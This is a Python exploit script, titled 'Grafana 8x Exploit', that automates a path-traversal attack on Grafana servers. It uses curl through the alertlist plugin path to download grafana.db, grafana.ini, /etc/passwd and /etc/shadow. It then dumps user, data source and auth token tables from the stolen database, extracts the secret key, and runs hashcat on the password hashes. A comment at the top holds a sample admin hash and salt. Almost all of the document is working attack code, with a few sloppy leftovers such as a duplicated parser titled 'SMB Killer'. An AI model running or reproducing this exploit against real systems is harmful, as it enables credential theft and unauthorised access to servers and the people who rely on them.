#!/usr/bin/env python3

# user         email                         hash                                                                                            salt
#'admin', 'admin@localhost', '', '7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8', 'YObSoLj55S', 'hLLY6QQ4Y6',


# This script is for a SHA256 hash, if file is utilizing AES it can still be used but to crack you need to use AESDecrypt.go

import os
import argparse
import sys
import time

print("Installing dependencies")

try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

try:
    import sqlite3
except ImportError:
    os.system("pip3 install sqlite3")
    os.system("pip install sqlite3")

try:    
    import pandas as pd
except ImportError:
    os.system("pip3 install pandas")
    os.system("pip install pandas")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Grafana 8x Exploit",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="SMB Killer", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-u", "--URL", action="store", help="URL with port number (ex: http://10.10.10.1:3000)")
args = parser.parse_args()

URL = args.URL

parser.parse_args(args=None if sys.argv[1:] else ['--help'])

def RUN():
    print(MAGENTA+"Running CuRL commands to retrieve database and grafana.ini file \n"+RESET)
    os.system('''curl --path-as-is '''+URL+'''/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db''')
    os.system('curl --path-as-is '+URL+'/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini > grafanaini.txt')
    print(YELLOW+"Running CuRL to retrieve /etc/passwd and if possible /etc/shadow \n"+RESET)
    os.system('''curl --path-as-is '''+URL+'''/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd.txt''')
    os.system('''curl --path-as-is '''+URL+'''/public/plugins/alertlist/../../../../../../../../etc/shadow -o shadow.txt''')
    print(GREEN+"If passwords are in AES you will need the secret_key found here: \n")
    os.system("cat grafanaini.txt | grep secret_key > secret_key.txt")
    with open("secret_key.txt") as f:
        print(f.read())
def SQLITE():
    print(MAGENTA+"Logging into sqlite3 database to retrieve hashes \n"+RESET)
    connection=sqlite3.connect('grafana.db')
    print(connection.total_changes)
    c=connection.cursor()
    print(RED+"TRYING TO DROP HASHES FROM USER TABLE \n"+RESET)
    c.execute('select * from user;')
    query2_data=c.fetchall()
    print(query2_data)
    print(YELLOW+"TRYING TO DROP HASHES FROM DATA_SOURCE TABLE \n"+RESET)
    c.execute('select * from data_source;')
    query2_data=c.fetchall()
    print(query2_data)
    print(GREEN+"CHECKING USER_AUTH TABLE \n"+RESET)
    c.execute('select * from user_auth;')
    query2_data=c.fetchall()
    print(query2_data)
    print(MAGENTA+"CHECKING USER_AUTH_TOKEN TABLE \n"+RESET)
    c.execute('select * from user_auth_token;')
    query2_data=c.fetchall()
    print(query2_data)
    print("\n")
def HASHCRACKGO():
    print(RED+"Going to need you to put in a little work, going to need the hashes put in one file and the salt put into another. We are going to try and crack the hashes with 2 different go files \n"+RESET)
    os.system("go run pass.go")
    print(YELLOW+"Running hashcat to crack file"+RESET)
    os.system("hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt")

if URL != None:
    RUN()
    time.sleep(2)
    SQLITE()
    HASHCRACKGO()
